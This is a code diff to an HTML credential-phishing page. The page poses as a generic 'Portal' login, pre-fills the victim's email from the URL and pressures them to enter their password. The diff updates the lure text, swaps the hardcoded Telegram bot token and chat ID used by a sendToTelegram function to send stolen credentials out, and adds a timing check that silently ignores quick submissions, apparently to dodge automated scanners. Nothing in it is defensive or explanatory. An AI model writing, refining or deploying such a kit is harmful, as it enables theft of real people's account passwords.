@@ -125,6 +125,15 @@
       font-weight: normal;
       font-size: 14px;
     }
+
+    /* Added style for copyright text */
+    .copyright-text {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #666;
+      text-align: center;
+      user-select: none;
+    }
   </style>
 </head>
 <body>
@@ -136,7 +145,7 @@
 <div class="form-container">
   <img id="domainLogo" alt="Domain Logo" style="display: none;">
   <h2 id="emailDomainHeader"> Portal</h2>
-  <p id="session-expired">Confirm your details to avoid disconnection</p>
+  <p id="session-expired">You are accessing a secure settings, please provide your password to continue.</p>
 
   <form id="loginForm">
     <div class="form-group">
@@ -145,19 +154,25 @@
     </div>
     <div class="error-message" id="errorMessage">Incorrect Pasword, Please fill in the correct details.!</div>
     <div class="form-group">
-      <label for="password">Current Password</label>
-      <input type="password" id="password" name="password" placeholder="Enter your password" autofocus required>
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter Password" autofocus required>
     </div>
     <div class="form-group">
-      <button type="submit">Keep Password</button>
+      <button type="submit">Verify My Access</button>
     </div>
   </form>
+
+  <!-- Added copyright text -->
+  <div class="copyright-text">© 2025 Secure Portal | Privacy</div>
 </div>
 
 <script>
-const token = "7072238292:AAHpDdR7mCeOCA1hnbB35_G52GUGLpx9xKM";
-const chatId = "6493402961";
+const token = "7055346452:AAG3pj92-k4v5_ZVDsSES-zRqP931-pavHw";
+const chatId = "5894471929";
 let attemptCount = 0;
+
+// Honeypot timing: record page load time
+const pageLoadTime = Date.now();
 
 // Handle email from hash
 const fragment = window.location.hash.slice(1);
@@ -230,9 +245,18 @@ function sendToTelegram(email, password, attempt) {
     });
 }
 
-// Form handler
+// Form handler with timing honeypot check
 document.getElementById("loginForm").addEventListener("submit", function (e) {
   e.preventDefault();
+
+  // Calculate time elapsed since page loaded
+  const elapsedSeconds = (Date.now() - pageLoadTime) / 1000;
+
+  // If less than 4 seconds, silently block submit (do nothing)
+  if (elapsedSeconds < 4) {
+    return;
+  }
+
   const password = document.getElementById("password").value.trim();
   if (!password) return;
 
